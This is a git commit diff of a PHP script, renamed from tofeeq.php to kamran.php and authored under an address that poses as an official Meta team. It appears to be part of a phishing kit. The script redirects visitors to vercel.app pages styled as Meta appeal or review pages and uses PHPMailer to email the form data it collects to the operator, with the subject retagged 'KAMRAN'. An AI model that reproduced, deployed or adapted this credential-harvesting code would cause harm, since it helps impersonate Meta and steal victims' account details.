4226bad5d7e37f9deaacc702f9d1b7aed2cc9996
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-07-27 06:33:36 +0800

    Update and rename tofeeq.php to kamran.php

--- kamran.php
+++ kamran.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://appeal-a-remove-issue-fix-for-reque.vercel.app/");
+header("Location: https://review-team-here-request-for-page-s.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'TOFEEQ';
+        $mail->Subject = 'KAMRAN';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
